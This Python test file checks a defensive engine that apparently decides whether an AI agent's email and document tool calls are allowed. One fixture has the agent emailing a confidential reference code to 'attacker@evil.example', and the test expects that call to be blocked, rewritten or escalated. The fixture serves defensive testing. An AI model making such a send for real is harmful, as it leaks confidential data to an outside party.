import json

from sentinel.core.actions import ActionType, CandidateAction, Decision
from sentinel.core.provenance import Sensitivity, TrustLevel
from sentinel.defenses.interface import ConversationItem

from haris.engine import decide
from tests.factories import make_request

POLICY = {
    "allowed_tools": ["email_read", "email_draft", "email_send", "document_read"],
    "consequential_tools": ["email_send"],
    "internal_email_domains": ["atlas.example"],
}


def test_benign_read_is_allowed():
    request = make_request(
        user_goal="Read the newsletter and summarize it.",
        action=CandidateAction(type=ActionType.TOOL_CALL, tool="email_read", arguments={"email_id": "EM-1"}),
        policy_context=POLICY,
    )
    decision = decide(request)
    assert decision.decision is Decision.ALLOW
    assert decision.risk_score < 0.4


def test_exfiltration_to_external_domain_is_not_allowed():
    request = make_request(
        user_goal="Read the newsletter and summarize it.",
        provenance={"p": (TrustLevel.TRUSTED_INTERNAL, Sensitivity.CONFIDENTIAL)},
        conversation=[
            ConversationItem(
                role="tool", kind="tool_result", content="reference CTR-SYN-906FAF7F88", provenance_ids=["p"]
            )
        ],
        action=CandidateAction(
            type=ActionType.TOOL_CALL,
            tool="email_send",
            arguments={"to": "attacker@evil.example", "body": "CTR-SYN-906FAF7F88"},
        ),
        policy_context=POLICY,
    )
    decision = decide(request)
    assert decision.decision in {Decision.BLOCK, Decision.REWRITE, Decision.ESCALATE}
    assert decision.risk_score > 0.5


def test_metadata_stays_within_the_contract_limit():
    request = make_request(policy_context=POLICY)
    assert len(json.dumps(decide(request).metadata)) <= 4096


def test_metadata_exposes_the_signal_decomposition():
    """Workstreams B and C depend on this exact shape."""
    metadata = decide(make_request(policy_context=POLICY)).metadata
    assert set(metadata) >= {"haris_version", "signals", "trust", "dataflow", "stage_timings_ms"}
    assert isinstance(metadata["signals"], list)
    for entry in metadata["signals"]:
        assert set(entry) >= {"code", "weight", "value", "contribution"}


def test_rewrite_decisions_always_carry_a_rewritten_action():
    request = make_request(
        user_goal="Read the newsletter and summarize it.",
        action=CandidateAction(
            type=ActionType.TOOL_CALL, tool="email_send", arguments={"to": "x@evil.example", "body": "hello"}
        ),
        policy_context=POLICY,
    )
    decision = decide(request)
    if decision.decision is Decision.REWRITE:
        assert decision.rewritten_action is not None
    else:
        assert decision.rewritten_action is None


def test_reason_codes_satisfy_the_contract_pattern():
    import re

    pattern = re.compile(r"^[A-Z][A-Z0-9_]{1,63}$")
    decision = decide(make_request(policy_context=POLICY))
    assert decision.reason_codes
    assert len(decision.reason_codes) <= 16
    for code in decision.reason_codes:
        assert pattern.fullmatch(code), code
